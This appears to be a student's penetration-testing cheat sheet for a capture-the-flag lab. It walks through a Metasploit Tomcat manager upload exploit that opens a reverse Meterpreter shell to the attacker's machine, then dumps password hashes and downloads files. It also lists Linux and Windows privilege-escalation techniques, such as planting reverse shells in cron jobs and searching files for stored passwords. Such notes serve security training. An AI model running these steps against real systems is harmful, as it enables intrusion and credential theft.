#!/bin/bash

# METASPLOIT FRAMEWORK
  Metasploit Framework is an open-source penetration testing framework that provides a database of exploits, payloads and post-exploitation modules.
  It wraps complex exploitation code into simple commands.
  Metasploit has four main module types:
  1. Exploits (code that takes advantage of a vulnerability to gain access)
  2. Payloads (code that runs after exploitation - reverse shell, command execution)
  3. Auxiliary (scanners, fuzzers, recon modules)
  4. Post (post-exploitation - privilege escalation, credential dumping, persistence)
# Metasploit Framework Console
  "START MSF CONSOLE $msfconsole : Metasploit Framework Console  (LINUX)"
     "msf6 > help" : shows all available commands
     "msf6 > search apache tomcat"  (SEARCHING FOR EXPLOITS)
     FORMAT- Name Disclosure Rank
      0 exploit/multi/http/tomcat_mgr_upload 2009-11-09 excellent
      1 exploit/multi/http/tomcat_mgr_deploy 2009-11-09 excellent
      2 auxiliary/scanner/http/tomcat_mgr_login 2009-11-09 normal
     Rank matters: excellent > great > good > normal > average > low > manual
     "msf6 > use exploit/multi/http/tomcat_mgr_upload"  (USING AN EXPLOIT)
     "msf6 exploit(tomcat_mgr_upload) > show options"
      Module options (exploit/multi/http/tomcat_mgr_upload):
      Name Current Setting Required Description
      RHOSTS yes Target host(s)
      RPORT 8080 yes Target port
      HttpUsername no Manager username
      HttpPassword no Manager password
     "msf6 > set RHOSTS 10.10.10.95"  <- Target IP
     "msf6 > set RPORT 8080"
     "msf6 > set HttpUsername tomcat"
     "msf6 > set HttpPassword tomcat"
     Set the payload (what happens after exploitation)
     "msf6 > show payloads"
     "msf6 > set payload java/meterpreter/reverse_tcp"
     "msf6 > set LHOST YOUR_KALI_IP"  <- Your attacking machine IP
     "msf6 > set LPORT 4444"
     "msf6 > run"
      [*] Started reverse TCP handler on 10.10.14.5:4444
      [*] Uploading WAR file...
      [+] Successfully uploaded shell
      [*] Meterpreter session 1 opened
     "meterpreter > sysinfo"  (METERPRETER SESSION)
      Computer : JERRY
      OS : Windows Server 2012 R2 (Build 9600)
      Architecture : x64
     "meterpreter > getuid"
      Server username: JERRY\Administrator
       Already running as Administrator - no privilege escalation needed
     "meterpreter > shell"                        <- drop to OS command prompt
     "meterpreter > search -f user.txt"           <- find flag files
     "meterpreter > hashdump"                     <- dump Windows password hashes
     "meterpreter > download C:\\flag.txt /tmp/"  <- download files from target

# PRIVILEGE ESCALATION  (PrivEsc)
  Privilege escalation is the process of abusing a misconfiguration, vulnerability, or design flaw to gain higher privileges.
  This is the most technically complex phase of a pentest.
# LINUX PrivEsc (KEY TECHNIQUES)
1. SUID binaries: 'find / -perm -4000 2>/dev/null'
    check gtfobins.github.io for each result
2. 'sudo -l'
    What can the current user run as root? Every result on gtfobins is a potential escalation
3. Writable cron jobs: 'cat /etc/crontab'
    If a script runs as root and you can write to it, add a reverse shell
4. World-writable service scripts: Find scripts owned by root that run as a service and are writable by your user
5. Kernel exploits: 'uname -a'
    Check kernel version -> searchsploit for local privilege escalation
6. Passwords in files: 'grep -r "password" /etc /home /var 2>/dev/null'
7. Weak file permissions: 'ls -la /etc/passwd /etc/shadow'
    Writable /etc/passwd = add root user
8. PATH hijacking: If a SUID binary calls programs without full path, put your script earlier in PATH
# WINDOWS PrivEsc (KEY TECHNIQUES)
1. 'whoami /priv' : Check current user privileges - SeImpersonatePrivilege = Potato attacks
2. Unquoted service paths: Service paths with spaces and no quotes = place malicious binary in the path
3. Weak service permissions: Can you modify a service that runs as SYSTEM? sc qc servicename
4. AlwaysInstallElevated: Registry keys - if set, .msi files run as SYSTEM
5. Stored credentials:
    'cmdkey /list'
    'dir /a C:\Users\ '
    'findstr /si password *.txt'
6. Scheduled tasks: 'schtasks /query /fo LIST /v' : find tasks running as SYSTEM
7. DLL hijacking: Find applications that load DLLs from writable directories
8. Token impersonation: Meterpreter: getsystem - tries multiple privilege escalation techniques automatically















































